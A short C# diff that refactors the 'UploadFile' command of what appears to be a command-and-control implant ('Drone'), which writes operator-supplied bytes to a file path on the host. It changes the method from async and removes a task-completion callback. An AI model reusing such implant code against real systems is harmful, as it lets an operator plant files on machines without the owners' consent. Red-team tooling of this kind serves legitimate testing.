@@ -9,9 +9,9 @@ public sealed class UploadFile : DroneCommand
     public override byte Command => 0x1D;
     public override bool Threaded => false;
 
-    public override async Task Execute(DroneTask task, CancellationToken cancellationToken)
+    public override Task Execute(DroneTask task, CancellationToken cancellationToken)
     {
         File.WriteAllBytes(task.Arguments[0], task.Artefact);
-        await Drone.SendTaskComplete(task.Id);
+        return Task.CompletedTask;
     }
 }
